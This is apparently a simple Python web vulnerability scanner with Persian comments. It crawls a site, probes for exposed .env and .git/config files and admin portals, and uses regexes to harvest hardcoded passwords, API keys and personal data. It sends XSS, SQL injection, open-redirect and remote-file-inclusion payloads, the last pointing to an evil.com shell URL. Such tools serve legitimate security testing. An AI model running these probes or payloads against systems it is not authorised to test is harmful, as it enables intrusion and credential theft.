import argparse
import requests
from bs4 import BeautifulSoup
import re
import csv
from urllib.parse import urljoin, urlparse
import json
from collections import defaultdict
import sys
import time

# لیست کلمات کلیدی برای جستجو در URLها یا فایل‌ها
KEYWORDS = ['main', 'app', 'runtime', 'bundle', 'polyfills', 'auth', 'config', 'settings', 'local', 'dev', 'data', 'api', 'session', 'user', 'core', 'client', 'server', 'utils', 'base']

# لیست آسیب‌پذیری‌ها به ترتیب اهمیت (بر اساس لیست ارائه‌شده)
VULNERABILITIES = [
    "Authentication bypass",
    "Sensitive info leaks",
    "Hardcoded credentials",
    "Config/env file disclosure",
    "Hidden login portals",
    "JWT secrets & API keys",
    "Outdated services loed CVE to exploit",
    "Dependency confusion",
    "File upload endpoints",
    "RFI → RCE",
    "Open redirection",
    "DOM-based XSS",
    "WebSocket endpoints",
    "Hidden parameters",
    "IDOR"
]

# Regex patterns برای جستجوی حساس
SENSITIVE_PATTERNS = {
    "Hardcoded credentials": r'(password|pwd|pass)\s*[:=]\s*["\'](.+?)["\']',
    "JWT secrets & API keys": r'(api_key|apikey|secret|jwt_token|access_token|bearer)\s*[:=]\s*["\'](.+?)["\']',
    "Sensitive info leaks": r'(email|phone|address|ssn|credit_card)\s*[:=]\s*["\'](.+?)["\']'
}

# مسیرهای رایج برای disclosure
DISCLOSURE_PATHS = ['.env', '.config', 'config.json', 'settings.json', '.git/config', 'debug.log']

# مسیرهای hidden portals
HIDDEN_PORTALS = ['/admin', '/login', '/dashboard', '/wp-admin', '/phpmyadmin']

# Payloadهای ساده برای تست
XSS_PAYLOAD = "<script>alert('XSS')</script>"
SQLI_PAYLOAD = "' OR '1'='1"
REDIRECT_PAYLOAD = "http://evil.com"
RFI_PAYLOAD = "http://evil.com/shell.php"

def crawl_site(base_url, max_depth=2):
    """کراول ساده سایت برای یافتن لینک‌ها با کلمات کلیدی"""
    visited = set()
    to_visit = [(base_url, 0)]
    found_links = defaultdict(list)
    
    while to_visit:
        url, depth = to_visit.pop(0)
        if url in visited or depth > max_depth:
            continue
        visited.add(url)
        
        try:
            response = requests.get(url, timeout=5)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            
            for link in soup.find_all(['a', 'script', 'link'], href=True):
                href = link.get('href') or link.get('src')
                full_url = urljoin(url, href)
                if urlparse(full_url).netloc == urlparse(base_url).netloc:
                    to_visit.append((full_url, depth + 1))
                    for kw in KEYWORDS:
                        if kw in href.lower():
                            found_links[kw].append(full_url)
        except Exception:
            pass
    
    return found_links

def check_vulnerability(url, vuln_type):
    """چک ساده برای هر آسیب‌پذیری"""
    results = []
    try:
        if vuln_type == "Config/env file disclosure":
            for path in DISCLOSURE_PATHS:
                test_url = urljoin(url, path)
                resp = requests.get(test_url)
                if resp.status_code == 200 and ('=' in resp.text or 'key' in resp.text.lower()):
                    results.append(f"Possible disclosure at {test_url}")
        
        elif vuln_type == "Hidden login portals":
            for path in HIDDEN_PORTALS:
                test_url = urljoin(url, path)
                resp = requests.get(test_url)
                if resp.status_code == 200 and ('login' in resp.text.lower() or 'admin' in resp.text.lower()):
                    results.append(f"Hidden portal found at {test_url}")
        
        elif vuln_type in SENSITIVE_PATTERNS:
            resp = requests.get(url)
            matches = re.findall(SENSITIVE_PATTERNS[vuln_type], resp.text, re.IGNORECASE)
            for match in matches:
                results.append(f"Found {vuln_type}: {match[0]} = {match[1]} at {url}")
        
        elif vuln_type == "Open redirection":
            test_url = url + "?redirect=" + REDIRECT_PAYLOAD
            resp = requests.get(test_url, allow_redirects=False)
            if resp.status_code in [301, 302] and 'evil.com' in resp.headers.get('Location', ''):
                results.append(f"Open redirect at {test_url}")
        
        elif vuln_type == "DOM-based XSS":
            test_url = url + "?q=" + XSS_PAYLOAD
            resp = requests.get(test_url)
            if XSS_PAYLOAD in resp.text:
                results.append(f"Possible DOM XSS at {test_url}")
        
        elif vuln_type == "RFI → RCE":
            test_url = url + "?file=" + RFI_PAYLOAD
            resp = requests.get(test_url)
            if 'shell' in resp.text.lower():  # ساده، نیاز به چک واقعی
                results.append(f"Possible RFI at {test_url}")
        
        elif vuln_type == "IDOR":
            if '?id=' in url:
                original_id = re.search(r'id=(\d+)', url).group(1)
                test_id = str(int(original_id) + 1)
                test_url = re.sub(r'id=\d+', f'id={test_id}', url)
                resp = requests.get(test_url)
                if resp.status_code == 200 and 'access denied' not in resp.text.lower():
                    results.append(f"Possible IDOR at {test_url}")
        
        # برای سایرین، چک ساده یا skip اگر پیچیده
        elif vuln_type == "Authentication bypass":
            # تست ساده JWT یا basic auth
            results.append("Manual check required for auth bypass")
        
        elif vuln_type == "Outdated services loed CVE to exploit":
            resp = requests.get(url)
            if 'version' in resp.text:
                results.append("Possible outdated service, check CVE manually")
        
        # ... می‌توانید برای بقیه اضافه کنید
        
    except Exception:
        pass
    
    return results

def generate_reports(results):
    """تولید خروجی CSV و HTML"""
    timestamp = time.strftime("%Y%m%d-%H%M%S")
    
    # CSV
    with open(f"vuln_report_{timestamp}.csv", 'w', newline='') as csvfile:
        writer = csv.writer(csvfile)
        writer.writerow(["Vulnerability", "Details", "URL"])
        for vuln in VULNERABILITIES:
            for detail in results.get(vuln, []):
                writer.writerow([vuln, detail, ""])
    
    # HTML
    html = "<html><body><h1>Vulnerability Report</h1><table border='1'>"
    html += "<tr><th>Vulnerability</th><th>Details</th></tr>"
    for vuln in VULNERABILITIES:
        for detail in results.get(vuln, []):
            html += f"<tr><td>{vuln}</td><td>{detail}</td></tr>"
    html += "</table></body></html>"
    with open(f"vuln_report_{timestamp}.html", 'w') as htmlfile:
        htmlfile.write(html)

def main():
    parser = argparse.ArgumentParser(description="Web Vulnerability Scanner")
    parser.add_argument("url", help="Base URL of the site to scan")
    args = parser.parse_args()
    
    print("Crawling site...")
    found_links = crawl_site(args.url)
    
    results = defaultdict(list)
    for kw, links in found_links.items():
        for link in links:
            print(f"Scanning {link} for vulnerabilities...")
            for vuln in VULNERABILITIES:
                vulns_found = check_vulnerability(link, vuln)
                results[vuln].extend(vulns_found)
    
    generate_reports(results)
    print("Reports generated: CSV and HTML files.")

if __name__ == "__main__":
    main()
